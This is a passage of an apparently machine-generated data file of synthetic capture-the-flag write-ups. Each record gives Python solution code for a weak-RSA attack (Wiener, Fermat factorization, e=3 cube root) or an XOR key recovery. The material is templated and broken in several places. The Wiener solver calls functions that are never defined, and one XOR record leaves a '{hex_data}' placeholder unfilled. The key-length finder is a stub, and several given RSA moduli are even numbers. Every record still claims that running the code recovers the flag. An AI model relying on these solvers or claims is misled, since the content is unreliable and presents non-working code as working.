Factorize n\np, q = fermat_factorization(n)\nphi = (p - 1) * (q - 1)\nd = gmpy2.invert(e, phi)\nm = pow(c, d, n)\nflag = long_to_bytes(m)\nprint(flag.decode())\n", "url": "https://synthetic-ctf.example.com/rsa/85", "year": 2024, "category": "crypto", "file_type": ".md", "scraped_at": "2025-10-26T16:04:14.827257", "synthetic": true}
{"id": "synthetic_rsa_086", "team": "synthetic_team_3", "event": "CTF_2024_Event_3", "challenge_name": "RSA Wiener Attack #87", "challenge_description": "RSA with small private exponent d, vulnerable to Wiener attack", "attack_type": "RSA", "tools_used": ["gmpy2", "fractions"], "difficulty": "medium", "writeup": "# RSA Wiener Attack\n\n## Challenge Description\nRSA with small private exponent d, vulnerable to Wiener attack\n\n## Analysis\nThis challenge involves rsa wiener attack techniques. The vulnerability can be exploited using the following approach:\n\n## Solution\n```python\n\nimport gmpy2\nfrom fractions import Fraction\nfrom Crypto.Util.number import long_to_bytes\n\ndef wiener_attack(n, e):\n    # Continued fraction expansion of e/n\n    convergents = []\n    cf = continued_fraction(e, n)\n    \n    for i in range(len(cf)):\n        convergent = convergents_from_cf(cf[:i+1])\n        k, d = convergent[-1]\n        \n        if k != 0 and (e * d - 1) % k == 0:\n            phi = (e * d - 1) // k\n            s = n - phi + 1\n            discriminant = s * s - 4 * n\n            \n            if discriminant >= 0:\n                sqrt_discriminant = gmpy2.isqrt(discriminant)\n                if sqrt_discriminant * sqrt_discriminant == discriminant:\n                    return d\n    return None\n\n# Attack implementation\nd = wiener_attack(n, e)\nif d:\n    m = pow(c, d, n)\n    flag = long_to_bytes(m)\n    print(flag.decode())\n\n```\n\n## Tools Used\n- gmpy2, fractions\n\n## Difficulty\nMedium\n\n## Flag\nThe flag can be recovered by executing the solution code above.", "solution_code": "\nimport gmpy2\nfrom fractions import Fraction\nfrom Crypto.Util.number import long_to_bytes\n\ndef wiener_attack(n, e):\n    # Continued fraction expansion of e/n\n    convergents = []\n    cf = continued_fraction(e, n)\n    \n    for i in range(len(cf)):\n        convergent = convergents_from_cf(cf[:i+1])\n        k, d = convergent[-1]\n        \n        if k != 0 and (e * d - 1) % k == 0:\n            phi = (e * d - 1) // k\n            s = n - phi + 1\n            discriminant = s * s - 4 * n\n            \n            if discriminant >= 0:\n                sqrt_discriminant = gmpy2.isqrt(discriminant)\n                if sqrt_discriminant * sqrt_discriminant == discriminant:\n                    return d\n    return None\n\n# Attack implementation\nd = wiener_attack(n, e)\nif d:\n    m = pow(c, d, n)\n    flag = long_to_bytes(m)\n    print(flag.decode())\n", "url": "https://synthetic-ctf.example.com/rsa/86", "year": 2024, "category": "crypto", "file_type": ".md", "scraped_at": "2025-10-26T16:04:14.827274", "synthetic": true}
{"id": "synthetic_rsa_087", "team": "synthetic_team_2", "event": "CTF_2024_Event_11", "challenge_name": "RSA Fermat Factorization #88", "challenge_description": "RSA with close prime factors, vulnerable to Fermat factorization", "attack_type": "RSA", "tools_used": ["gmpy2"], "difficulty": "medium", "writeup": "# RSA Fermat Factorization\n\n## Challenge Description\nRSA with close prime factors, vulnerable to Fermat factorization\n\n## Analysis\nThis challenge involves rsa fermat factorization techniques. The vulnerability can be exploited using the following approach:\n\n## Solution\n```python\n\nimport gmpy2\nfrom Crypto.Util.number import long_to_bytes\n\ndef fermat_factorization(n):\n    a = gmpy2.isqrt(n) + 1\n    \n    while True:\n        b_squared = a * a - n\n        b = gmpy2.isqrt(b_squared)\n        \n        if b * b == b_squared:\n            p = a + b\n            q = a - b\n            return p, q\n        a += 1\n\n# Factorize n\np, q = fermat_factorization(n)\nphi = (p - 1) * (q - 1)\nd = gmpy2.invert(e, phi)\nm = pow(c, d, n)\nflag = long_to_bytes(m)\nprint(flag.decode())\n\n```\n\n## Tools Used\n- gmpy2\n\n## Difficulty\nMedium\n\n## Flag\nThe flag can be recovered by executing the solution code above.", "solution_code": "\nimport gmpy2\nfrom Crypto.Util.number import long_to_bytes\n\ndef fermat_factorization(n):\n    a = gmpy2.isqrt(n) + 1\n    \n    while True:\n        b_squared = a * a - n\n        b = gmpy2.isqrt(b_squared)\n        \n        if b * b == b_squared:\n            p = a + b\n            q = a - b\n            return p, q\n        a += 1\n\n# Factorize n\np, q = fermat_factorization(n)\nphi = (p - 1) * (q - 1)\nd = gmpy2.invert(e, phi)\nm = pow(c, d, n)\nflag = long_to_bytes(m)\nprint(flag.decode())\n", "url": "https://synthetic-ctf.example.com/rsa/87", "year": 2023, "category": "crypto", "file_type": ".md", "scraped_at": "2025-10-26T16:04:14.827290", "synthetic": true}
{"id": "synthetic_rsa_088", "team": "synthetic_team_4", "event": "CTF_2024_Event_18", "challenge_name": "RSA Fermat Factorization #89", "challenge_description": "RSA with close prime factors, vulnerable to Fermat factorization", "attack_type": "RSA", "tools_used": ["gmpy2"], "difficulty": "medium", "writeup": "# RSA Fermat Factorization\n\n## Challenge Description\nRSA with close prime factors, vulnerable to Fermat factorization\n\n## Analysis\nThis challenge involves rsa fermat factorization techniques. The vulnerability can be exploited using the following approach:\n\n## Solution\n```python\n\nimport gmpy2\nfrom Crypto.Util.number import long_to_bytes\n\ndef fermat_factorization(n):\n    a = gmpy2.isqrt(n) + 1\n    \n    while True:\n        b_squared = a * a - n\n        b = gmpy2.isqrt(b_squared)\n        \n        if b * b == b_squared:\n            p = a + b\n            q = a - b\n            return p, q\n        a += 1\n\n# Factorize n\np, q = fermat_factorization(n)\nphi = (p - 1) * (q - 1)\nd = gmpy2.invert(e, phi)\nm = pow(c, d, n)\nflag = long_to_bytes(m)\nprint(flag.decode())\n\n```\n\n## Tools Used\n- gmpy2\n\n## Difficulty\nMedium\n\n## Flag\nThe flag can be recovered by executing the solution code above.", "solution_code": "\nimport gmpy2\nfrom Crypto.Util.number import long_to_bytes\n\ndef fermat_factorization(n):\n    a = gmpy2.isqrt(n) + 1\n    \n    while True:\n        b_squared = a * a - n\n        b = gmpy2.isqrt(b_squared)\n        \n        if b * b == b_squared:\n            p = a + b\n            q = a - b\n            return p, q\n        a += 1\n\n# Factorize n\np, q = fermat_factorization(n)\nphi = (p - 1) * (q - 1)\nd = gmpy2.invert(e, phi)\nm = pow(c, d, n)\nflag = long_to_bytes(m)\nprint(flag.decode())\n", "url": "https://synthetic-ctf.example.com/rsa/88", "year": 2023, "category": "crypto", "file_type": ".md", "scraped_at": "2025-10-26T16:04:14.827309", "synthetic": true}
{"id": "synthetic_rsa_089", "team": "synthetic_team_8", "event": "CTF_2024_Event_5", "challenge_name": "RSA Small Exponent Attack #90", "challenge_description": "RSA challenge with e=3, vulnerable to cube root attack", "attack_type": "RSA", "tools_used": ["gmpy2", "pycryptodome"], "difficulty": "easy", "writeup": "# RSA Small Exponent Attack\n\n## Challenge Description\nRSA challenge with e=3, vulnerable to cube root attack\n\n## Analysis\nThis challenge involves rsa small exponent attack techniques. The vulnerability can be exploited using the following approach:\n\n## Solution\n```python\n\nimport gmpy2\nfrom Crypto.Util.number import long_to_bytes\n\n# Given values\nn = 25460448044395221637362875654027798209327898382935302129251920615075248602780701677236632204530626367760051747592853317885244596550540317712367683353033661124813085074814366334752304205282428475567852945686934026450144567281586015884015053580192518758861449514531208358702501079114260690172146232383448\ne = 3\nc = 1628542912571094705179503389868550354524123846814389548963256929295551866643497517165834085323929207482242235162400032293729379885194036993206509979040188783103612880933799828050437864671034640073380613392515055379782192359003053113573414203505871045644936980776505299476900770024187421384349844942605\n\n# Cube root attack for small e\nm, exact = gmpy2.iroot(c, 3)\nif exact:\n    flag = long_to_bytes(m)\n    print(flag.decode())\n\n```\n\n## Tools Used\n- gmpy2, pycryptodome\n\n## Difficulty\nEasy\n\n## Flag\nThe flag can be recovered by executing the solution code above.", "solution_code": "\nimport gmpy2\nfrom Crypto.Util.number import long_to_bytes\n\n# Given values\nn = 25460448044395221637362875654027798209327898382935302129251920615075248602780701677236632204530626367760051747592853317885244596550540317712367683353033661124813085074814366334752304205282428475567852945686934026450144567281586015884015053580192518758861449514531208358702501079114260690172146232383448\ne = 3\nc = 1628542912571094705179503389868550354524123846814389548963256929295551866643497517165834085323929207482242235162400032293729379885194036993206509979040188783103612880933799828050437864671034640073380613392515055379782192359003053113573414203505871045644936980776505299476900770024187421384349844942605\n\n# Cube root attack for small e\nm, exact = gmpy2.iroot(c, 3)\nif exact:\n    flag = long_to_bytes(m)\n    print(flag.decode())\n", "url": "https://synthetic-ctf.example.com/rsa/89", "year": 2024, "category": "crypto", "file_type": ".md", "scraped_at": "2025-10-26T16:04:14.827342", "synthetic": true}
{"id": "synthetic_rsa_090", "team": "synthetic_team_1", "event": "CTF_2024_Event_19", "challenge_name": "RSA Small Exponent Attack #91", "challenge_description": "RSA challenge with e=3, vulnerable to cube root attack", "attack_type": "RSA", "tools_used": ["gmpy2", "pycryptodome"], "difficulty": "easy", "writeup": "# RSA Small Exponent Attack\n\n## Challenge Description\nRSA challenge with e=3, vulnerable to cube root attack\n\n## Analysis\nThis challenge involves rsa small exponent attack techniques. The vulnerability can be exploited using the following approach:\n\n## Solution\n```python\n\nimport gmpy2\nfrom Crypto.Util.number import long_to_bytes\n\n# Given values\nn = 60721605031553149750627017153071571372303354060512391393186582169012890251951176451472176738802145001355598676979672100204288158764949145868235675422651539852069307901143408851302151818710556965282779112299966337451983744876185435969366710741673804940038193535668596414154774714296258888779335692087164\ne = 3\nc = 17803433433386845700994603665002245360465219610263928232888583026439073190857799289990352495215296318025062211698045377207904124728409785036483328967627719515334602524194829016914318432562211895916297656679325402662700343945941821947223564017847381581516890754270829691255506473300973440476392196066513\n\n# Cube root attack for small e\nm, exact = gmpy2.iroot(c, 3)\nif exact:\n    flag = long_to_bytes(m)\n    print(flag.decode())\n\n```\n\n## Tools Used\n- gmpy2, pycryptodome\n\n## Difficulty\nEasy\n\n## Flag\nThe flag can be recovered by executing the solution code above.", "solution_code": "\nimport gmpy2\nfrom Crypto.Util.number import long_to_bytes\n\n# Given values\nn = 60721605031553149750627017153071571372303354060512391393186582169012890251951176451472176738802145001355598676979672100204288158764949145868235675422651539852069307901143408851302151818710556965282779112299966337451983744876185435969366710741673804940038193535668596414154774714296258888779335692087164\ne = 3\nc = 17803433433386845700994603665002245360465219610263928232888583026439073190857799289990352495215296318025062211698045377207904124728409785036483328967627719515334602524194829016914318432562211895916297656679325402662700343945941821947223564017847381581516890754270829691255506473300973440476392196066513\n\n# Cube root attack for small e\nm, exact = gmpy2.iroot(c, 3)\nif exact:\n    flag = long_to_bytes(m)\n    print(flag.decode())\n", "url": "https://synthetic-ctf.example.com/rsa/90", "year": 2024, "category": "crypto", "file_type": ".md", "scraped_at": "2025-10-26T16:04:14.827377", "synthetic": true}
{"id": "synthetic_rsa_091", "team": "synthetic_team_8", "event": "CTF_2024_Event_3", "challenge_name": "RSA Small Exponent Attack #92", "challenge_description": "RSA challenge with e=3, vulnerable to cube root attack", "attack_type": "RSA", "tools_used": ["gmpy2", "pycryptodome"], "difficulty": "easy", "writeup": "# RSA Small Exponent Attack\n\n## Challenge Description\nRSA challenge with e=3, vulnerable to cube root attack\n\n## Analysis\nThis challenge involves rsa small exponent attack techniques. The vulnerability can be exploited using the following approach:\n\n## Solution\n```python\n\nimport gmpy2\nfrom Crypto.Util.number import long_to_bytes\n\n# Given values\nn = 80667066596660402933969335958474987324076036271880000965960825829467470149033349657934024827247293905350019271019142437688885786046295945555618327785953988938352543468812401660624905473782431732785566891687980651577195179208245027542040602948507196740455498729932504686215633469583239945589274261877232\ne = 3\nc = 25728003536614633993026191561813608671072387345171427972857753011964149300696396152883815587027658094104731778790253243649399866995428715086551438445076168884833845113144062330445890073843561334663987021299068012753705263411894636593984385942834148363783796293188093627435268291961415667700672439448317\n\n# Cube root attack for small e\nm, exact = gmpy2.iroot(c, 3)\nif exact:\n    flag = long_to_bytes(m)\n    print(flag.decode())\n\n```\n\n## Tools Used\n- gmpy2, pycryptodome\n\n## Difficulty\nEasy\n\n## Flag\nThe flag can be recovered by executing the solution code above.", "solution_code": "\nimport gmpy2\nfrom Crypto.Util.number import long_to_bytes\n\n# Given values\nn = 80667066596660402933969335958474987324076036271880000965960825829467470149033349657934024827247293905350019271019142437688885786046295945555618327785953988938352543468812401660624905473782431732785566891687980651577195179208245027542040602948507196740455498729932504686215633469583239945589274261877232\ne = 3\nc = 25728003536614633993026191561813608671072387345171427972857753011964149300696396152883815587027658094104731778790253243649399866995428715086551438445076168884833845113144062330445890073843561334663987021299068012753705263411894636593984385942834148363783796293188093627435268291961415667700672439448317\n\n# Cube root attack for small e\nm, exact = gmpy2.iroot(c, 3)\nif exact:\n    flag = long_to_bytes(m)\n    print(flag.decode())\n", "url": "https://synthetic-ctf.example.com/rsa/91", "year": 2024, "category": "crypto", "file_type": ".md", "scraped_at": "2025-10-26T16:04:14.827410", "synthetic": true}
{"id": "synthetic_rsa_092", "team": "synthetic_team_9", "event": "CTF_2024_Event_8", "challenge_name": "RSA Small Exponent Attack #93", "challenge_description": "RSA challenge with e=3, vulnerable to cube root attack", "attack_type": "RSA", "tools_used": ["gmpy2", "pycryptodome"], "difficulty": "easy", "writeup": "# RSA Small Exponent Attack\n\n## Challenge Description\nRSA challenge with e=3, vulnerable to cube root attack\n\n## Analysis\nThis challenge involves rsa small exponent attack techniques. The vulnerability can be exploited using the following approach:\n\n## Solution\n```python\n\nimport gmpy2\nfrom Crypto.Util.number import long_to_bytes\n\n# Given values\nn = 47497892466545175450034208838387045243532514535510785722074784807589226006648919692543466910811884722816527409844554102027192030458049812607923099928621595778259579221781156927440264034033975215115077175506061014969025797870895553246208998903730893645248753595699488426074539035578629143495767497844666\ne = 3\nc = 2498359175461393482196174522076721314985441525075975702817247856955043261943278231625684721552976233128127017745037821202585696910627667264283383325962649029591879908784516255547551883838602218347110356640489742153271047592997955506467517433093759760073416469441133821807640262073631792532698181078726\n\n# Cube root attack for small e\nm, exact = gmpy2.iroot(c, 3)\nif exact:\n    flag = long_to_bytes(m)\n    print(flag.decode())\n\n```\n\n## Tools Used\n- gmpy2, pycryptodome\n\n## Difficulty\nEasy\n\n## Flag\nThe flag can be recovered by executing the solution code above.", "solution_code": "\nimport gmpy2\nfrom Crypto.Util.number import long_to_bytes\n\n# Given values\nn = 47497892466545175450034208838387045243532514535510785722074784807589226006648919692543466910811884722816527409844554102027192030458049812607923099928621595778259579221781156927440264034033975215115077175506061014969025797870895553246208998903730893645248753595699488426074539035578629143495767497844666\ne = 3\nc = 2498359175461393482196174522076721314985441525075975702817247856955043261943278231625684721552976233128127017745037821202585696910627667264283383325962649029591879908784516255547551883838602218347110356640489742153271047592997955506467517433093759760073416469441133821807640262073631792532698181078726\n\n# Cube root attack for small e\nm, exact = gmpy2.iroot(c, 3)\nif exact:\n    flag = long_to_bytes(m)\n    print(flag.decode())\n", "url": "https://synthetic-ctf.example.com/rsa/92", "year": 2023, "category": "crypto", "file_type": ".md", "scraped_at": "2025-10-26T16:04:14.827445", "synthetic": true}
{"id": "synthetic_rsa_093", "team": "synthetic_team_1", "event": "CTF_2024_Event_2", "challenge_name": "RSA Fermat Factorization #94", "challenge_description": "RSA with close prime factors, vulnerable to Fermat factorization", "attack_type": "RSA", "tools_used": ["gmpy2"], "difficulty": "medium", "writeup": "# RSA Fermat Factorization\n\n## Challenge Description\nRSA with close prime factors, vulnerable to Fermat factorization\n\n## Analysis\nThis challenge involves rsa fermat factorization techniques. The vulnerability can be exploited using the following approach:\n\n## Solution\n```python\n\nimport gmpy2\nfrom Crypto.Util.number import long_to_bytes\n\ndef fermat_factorization(n):\n    a = gmpy2.isqrt(n) + 1\n    \n    while True:\n        b_squared = a * a - n\n        b = gmpy2.isqrt(b_squared)\n        \n        if b * b == b_squared:\n            p = a + b\n            q = a - b\n            return p, q\n        a += 1\n\n# Factorize n\np, q = fermat_factorization(n)\nphi = (p - 1) * (q - 1)\nd = gmpy2.invert(e, phi)\nm = pow(c, d, n)\nflag = long_to_bytes(m)\nprint(flag.decode())\n\n```\n\n## Tools Used\n- gmpy2\n\n## Difficulty\nMedium\n\n## Flag\nThe flag can be recovered by executing the solution code above.", "solution_code": "\nimport gmpy2\nfrom Crypto.Util.number import long_to_bytes\n\ndef fermat_factorization(n):\n    a = gmpy2.isqrt(n) + 1\n    \n    while True:\n        b_squared = a * a - n\n        b = gmpy2.isqrt(b_squared)\n        \n        if b * b == b_squared:\n            p = a + b\n            q = a - b\n            return p, q\n        a += 1\n\n# Factorize n\np, q = fermat_factorization(n)\nphi = (p - 1) * (q - 1)\nd = gmpy2.invert(e, phi)\nm = pow(c, d, n)\nflag = long_to_bytes(m)\nprint(flag.decode())\n", "url": "https://synthetic-ctf.example.com/rsa/93", "year": 2023, "category": "crypto", "file_type": ".md", "scraped_at": "2025-10-26T16:04:14.827478", "synthetic": true}
{"id": "synthetic_rsa_094", "team": "synthetic_team_5", "event": "CTF_2024_Event_19", "challenge_name": "RSA Wiener Attack #95", "challenge_description": "RSA with small private exponent d, vulnerable to Wiener attack", "attack_type": "RSA", "tools_used": ["gmpy2", "fractions"], "difficulty": "medium", "writeup": "# RSA Wiener Attack\n\n## Challenge Description\nRSA with small private exponent d, vulnerable to Wiener attack\n\n## Analysis\nThis challenge involves rsa wiener attack techniques. The vulnerability can be exploited using the following approach:\n\n## Solution\n```python\n\nimport gmpy2\nfrom fractions import Fraction\nfrom Crypto.Util.number import long_to_bytes\n\ndef wiener_attack(n, e):\n    # Continued fraction expansion of e/n\n    convergents = []\n    cf = continued_fraction(e, n)\n    \n    for i in range(len(cf)):\n        convergent = convergents_from_cf(cf[:i+1])\n        k, d = convergent[-1]\n        \n        if k != 0 and (e * d - 1) % k == 0:\n            phi = (e * d - 1) // k\n            s = n - phi + 1\n            discriminant = s * s - 4 * n\n            \n            if discriminant >= 0:\n                sqrt_discriminant = gmpy2.isqrt(discriminant)\n                if sqrt_discriminant * sqrt_discriminant == discriminant:\n                    return d\n    return None\n\n# Attack implementation\nd = wiener_attack(n, e)\nif d:\n    m = pow(c, d, n)\n    flag = long_to_bytes(m)\n    print(flag.decode())\n\n```\n\n## Tools Used\n- gmpy2, fractions\n\n## Difficulty\nMedium\n\n## Flag\nThe flag can be recovered by executing the solution code above.", "solution_code": "\nimport gmpy2\nfrom fractions import Fraction\nfrom Crypto.Util.number import long_to_bytes\n\ndef wiener_attack(n, e):\n    # Continued fraction expansion of e/n\n    convergents = []\n    cf = continued_fraction(e, n)\n    \n    for i in range(len(cf)):\n        convergent = convergents_from_cf(cf[:i+1])\n        k, d = convergent[-1]\n        \n        if k != 0 and (e * d - 1) % k == 0:\n            phi = (e * d - 1) // k\n            s = n - phi + 1\n            discriminant = s * s - 4 * n\n            \n            if discriminant >= 0:\n                sqrt_discriminant = gmpy2.isqrt(discriminant)\n                if sqrt_discriminant * sqrt_discriminant == discriminant:\n                    return d\n    return None\n\n# Attack implementation\nd = wiener_attack(n, e)\nif d:\n    m = pow(c, d, n)\n    flag = long_to_bytes(m)\n    print(flag.decode())\n", "url": "https://synthetic-ctf.example.com/rsa/94", "year": 2023, "category": "crypto", "file_type": ".md", "scraped_at": "2025-10-26T16:04:14.827509", "synthetic": true}
{"id": "synthetic_rsa_095", "team": "synthetic_team_5", "event": "CTF_2024_Event_5", "challenge_name": "RSA Wiener Attack #96", "challenge_description": "RSA with small private exponent d, vulnerable to Wiener attack", "attack_type": "RSA", "tools_used": ["gmpy2", "fractions"], "difficulty": "medium", "writeup": "# RSA Wiener Attack\n\n## Challenge Description\nRSA with small private exponent d, vulnerable to Wiener attack\n\n## Analysis\nThis challenge involves rsa wiener attack techniques. The vulnerability can be exploited using the following approach:\n\n## Solution\n```python\n\nimport gmpy2\nfrom fractions import Fraction\nfrom Crypto.Util.number import long_to_bytes\n\ndef wiener_attack(n, e):\n    # Continued fraction expansion of e/n\n    convergents = []\n    cf = continued_fraction(e, n)\n    \n    for i in range(len(cf)):\n        convergent = convergents_from_cf(cf[:i+1])\n        k, d = convergent[-1]\n        \n        if k != 0 and (e * d - 1) % k == 0:\n            phi = (e * d - 1) // k\n            s = n - phi + 1\n            discriminant = s * s - 4 * n\n            \n            if discriminant >= 0:\n                sqrt_discriminant = gmpy2.isqrt(discriminant)\n                if sqrt_discriminant * sqrt_discriminant == discriminant:\n                    return d\n    return None\n\n# Attack implementation\nd = wiener_attack(n, e)\nif d:\n    m = pow(c, d, n)\n    flag = long_to_bytes(m)\n    print(flag.decode())\n\n```\n\n## Tools Used\n- gmpy2, fractions\n\n## Difficulty\nMedium\n\n## Flag\nThe flag can be recovered by executing the solution code above.", "solution_code": "\nimport gmpy2\nfrom fractions import Fraction\nfrom Crypto.Util.number import long_to_bytes\n\ndef wiener_attack(n, e):\n    # Continued fraction expansion of e/n\n    convergents = []\n    cf = continued_fraction(e, n)\n    \n    for i in range(len(cf)):\n        convergent = convergents_from_cf(cf[:i+1])\n        k, d = convergent[-1]\n        \n        if k != 0 and (e * d - 1) % k == 0:\n            phi = (e * d - 1) // k\n            s = n - phi + 1\n            discriminant = s * s - 4 * n\n            \n            if discriminant >= 0:\n                sqrt_discriminant = gmpy2.isqrt(discriminant)\n                if sqrt_discriminant * sqrt_discriminant == discriminant:\n                    return d\n    return None\n\n# Attack implementation\nd = wiener_attack(n, e)\nif d:\n    m = pow(c, d, n)\n    flag = long_to_bytes(m)\n    print(flag.decode())\n", "url": "https://synthetic-ctf.example.com/rsa/95", "year": 2023, "category": "crypto", "file_type": ".md", "scraped_at": "2025-10-26T16:04:14.827527", "synthetic": true}
{"id": "synthetic_xor_000", "team": "synthetic_team_6", "event": "CTF_2024_Event_1", "challenge_name": "Single Byte XOR #1", "challenge_description": "XOR cipher with single byte key", "attack_type": "XOR", "tools_used": ["python-builtin"], "difficulty": "easy", "writeup": "# Single Byte XOR\n\n## Challenge Description\nXOR cipher with single byte key\n\n## Analysis\nThis challenge involves single byte xor techniques. The vulnerability can be exploited using the following approach:\n\n## Solution\n```python\n\ndef single_byte_xor(data, key):\n    return bytes([b ^ key for b in data])\n\n# Brute force all possible keys\nencrypted = bytes.fromhex(\"{hex_data}\")\n\nfor key in range(256):\n    decrypted = single_byte_xor(encrypted, key)\n    try:\n        text = decrypted.decode('ascii')\n        if 'flag{' in text.lower():\n            print(f\"Key: {key}\")\n            print(f\"Flag: {text}\")\n            break\n    except:\n        continue\n\n```\n\n## Tools Used\n- python-builtin\n\n## Difficulty\nEasy\n\n## Flag\nThe flag can be recovered by executing the solution code above.", "solution_code": "\ndef single_byte_xor(data, key):\n    return bytes([b ^ key for b in data])\n\n# Brute force all possible keys\nencrypted = bytes.fromhex(\"{hex_data}\")\n\nfor key in range(256):\n    decrypted = single_byte_xor(encrypted, key)\n    try:\n        text = decrypted.decode('ascii')\n        if 'flag{' in text.lower():\n            print(f\"Key: {key}\")\n            print(f\"Flag: {text}\")\n            break\n    except:\n        continue\n", "url": "https://synthetic-ctf.example.com/xor/0", "year": 2024, "category": "crypto", "file_type": ".md", "scraped_at": "2025-10-26T16:04:14.827642", "synthetic": true}
{"id": "synthetic_xor_001", "team": "synthetic_team_10", "event": "CTF_2024_Event_18", "challenge_name": "Multi-byte XOR Key Reuse #2", "challenge_description": "XOR with repeating key, vulnerable to frequency analysis", "attack_type": "XOR", "tools_used": ["python-builtin", "frequency-analysis"], "difficulty": "medium", "writeup": "# Multi-byte XOR Key Reuse\n\n## Challenge Description\nXOR with repeating key, vulnerable to frequency analysis\n\n## Analysis\nThis challenge involves multi-byte xor key reuse techniques. The vulnerability can be exploited using the following approach:\n\n## Solution\n```python\n\ndef xor_decrypt(data, key):\n    result = []\n    for i, byte in enumerate(data):\n        result.append(byte ^ key[i % len(key)])\n    return bytes(result)\n\ndef find_key_length(ciphertext):\n    # Kasiski examination or index of coincidence\n    for key_len in range(2, 20):\n        blocks = [ciphertext[i::key_len] for i in range(key_len)]\n        # Analyze frequency patterns\n        # ... implementation details\n    return key_len\n\n# Key recovery and decryption\nencrypted = bytes.fromhex(\"cc724ec69a6e57282e2d0927039c8b0645bc648d8e1f4dcdcceb022d76288634\")\nkey_length = find_key_length(encrypted)\nkey = recover_key(encrypted, key_length)\nflag = xor_decrypt(encrypted, key)\nprint(flag.decode())\n\n```\n\n## Tools Used\n- python-builtin, frequency-analysis\n\n## Difficulty\nMedium\n\n## Flag\nThe flag can be recovered by executing the solution code above.", "solution_code": "\ndef xor_decrypt(data, key):\n    result = []\n    for i, byte in enumerate(data):\n        result.append(byte ^ key[i % len(key)])\n    return bytes(result)\n\ndef find_key_length(ciphertext):\n    # Kasiski examination or index of coincidence\n    for key_len in range(2, 20):\n        blocks = [ciphertext[i::key_len] for i in range(key_len)]\n        # Analyze frequency patterns\n        # ... implementation details\n    return key_len\n\n# Key recovery and decryption\nencrypted = bytes.fromhex(\"cc724ec69a6e57282e2d0927039c8b0645bc648d8e1f4dcdcceb022d76288634\")\nkey_length = find_key_length(encrypted)\nkey = recover_key(encrypted, key_length)\nflag = xor_decrypt(encrypted, key)\nprint(flag.decode())\n", "url": "https://synthetic-ctf.example.com/xor/1", "year": 2023, "category": "crypto", "file_type": ".md", "scraped_at": "2025-10-26T16:04:14.827708", "synthetic": true}
{"id": "synthetic_xor_002", "team": "synthetic_team_1", "event": "CTF_2024_Event_14", "challenge_name": "Multi-byte XOR Key Reuse #3", "challenge_description": "XOR with repeating key, vulnerable to frequency analysis", "attack_type": "XOR", "tools_used": ["python-builtin", "frequency-analysis"], "difficulty": "medium", "writeup": "# Multi-byte XOR Key Reuse\n\n## Challenge Description\nXOR with repeating key, vulnerable to frequency analysis\n\n## Analysis\nThis challenge involves multi-byte xor key reuse techniques. The vulnerability can be exploited using the following approach:\n\n## Solution\n```python\n\ndef xor_decrypt(data, key):\n    result = []\n    for i, byte in enumerate(data):\n        result.append(byte ^ key[i % len(key)])\n    return bytes(result)\n\ndef find_key_length(ciphertext):\n    # Kasiski examination or index of coincidence\n    for key_len in range(2, 20):\n        blocks = [ciphertext[i::key_len] for i in range(key_len)]\n        # Analyze frequency patterns\n        # ... implementation details\n    return key_len\n\n# Key recovery and decryption\nencrypted = bytes.fromhex(\"05a412a0b5fe445b0c9092a5fe7d56d7ce029456918bff6004933af769c45872\")\nkey_length = find_key_length(encrypted)\nkey = recover_key(encrypted, key_length)\nflag = xor_decrypt(encrypted, key)\nprint(flag.decode())\n\n```\n\n## Tools Used\n- python-builtin, frequency-analysis\n\n## Difficulty\nMedium\n\n## Flag\nThe flag can be recovered by executing the solution code above.", "solution_code": "\ndef xor_decrypt(data, key):\n    result = []\n    for i, byte in enumerate(data):\n        result.append(byte ^ key[i % len(key)])\n    return bytes(result)\n\ndef find_key_length(ciphertext):\n    # Kasiski examination or index of coincidence\n    for key_len in range(2, 20):\n        blocks = [ciphertext[i::key_len] for i in range(key_len)]\n        # Analyze frequency patterns\n        # ... implementation details\n    return key_len\n\n# Key recovery and decryption\nencrypted = bytes.fromhex(\"05a412a0b5fe445b0c9092a5fe7d56d7ce029456918bff6004933af769c45872\")\nkey_length = find_key_length(encrypted)\nkey = recover_key(encrypted, key_length)\nflag = xor_decrypt(encrypted, key)\nprint(flag.decode())\n", "url": "https://synthetic-ctf.example.com/xor/2", "year": 2024, "category": "crypto", "file_type": ".md", "scraped_at": "2025-10-26T16:04:14.827773", "synthetic": true}
{"id": "synthetic_xor_003", "team": "synthetic_team_1", "event": "CTF_2024_Event_17", "challenge_name": "Multi-byte XOR Key Reuse #4", "challenge_description": "XOR with repeating key, vulnerable to frequency analysis", "attack_type": "XOR", "tools_used": ["python-builtin", "frequency-analysis"], "difficulty": "medium", "writeup": "# Multi-byte XOR Key Reuse\n\n## Challenge Description\nXOR with repeating key, vulnerable to frequency analysis\n\n## Analysis\nThis challenge involves multi-byte xor key reuse techniques. The vulnerability can be exploited using the following approach:\n\n## Solution\n```python\n\ndef xor_decrypt(data, key):\n    result = []\n    for i, byte in enumerate(data):\n        result.append(byte ^ key[i % len(key)])\n    return bytes(result)\n\ndef find_key_length(ciphertext):\n    # Kasiski examination or index of coincidence\n    for key_len in range(2, 20):\n        blocks = [ciphertext[i::key_len] for i in range(key_len)]\n        # Analyze frequency patterns\n        # ... implementation details\n    return key_len\n\n# Key recovery and decryption\nencrypted = bytes.fromhex(\"d0633352bdaa8d68f954eb86c3abd0b97643957b0492e68a7788dbce6c6372fc\")\nkey_length = find_key_length(encrypted)\nkey = recover_key(encrypted, key_length)\nflag = xor_decrypt(encrypted, key)\nprint(flag.decode())\n\n```\n\n## Tools Used\n- python-builtin, frequency-analysis\n\n## Difficulty\nMedium\n\n## Flag\nThe flag can be recovered by executing the solution code above.", "solution_code": "\ndef xor_decrypt(data, key):\n    result = []\n    for i, byte in enumerate(data):\n        result.append(byte ^ key[i % len(key)])\n    return bytes(result)\n\ndef find_key_length(ciphertext):\n    # Kasiski examination or index of coincidence\n    for key_len in range(2, 20):\n        blocks = [ciphertext[i::key_len] for i in range(key_len)]\n        # Analyze frequency patterns\n        # ... implementation details\n    return key_len\n\n# Key recovery and decryption\nencrypted = bytes.fromhex(\"d0633352bdaa8d68f954eb86c3abd0b97643957b0492e68a7788dbce6c6372fc\")\nkey_length = find_key_length(encrypted)\nkey = recover_key(encrypted, key_length)\nflag = xor_decrypt(encrypted, key)\nprint(flag.decode())\n", "url": "https://synthetic-ctf.example.com/xor/3", "year": 2024, "category": "crypto", "file_type": ".md", "scraped_at": "2025-10-26T16:04:14.827823", "synthetic": true}
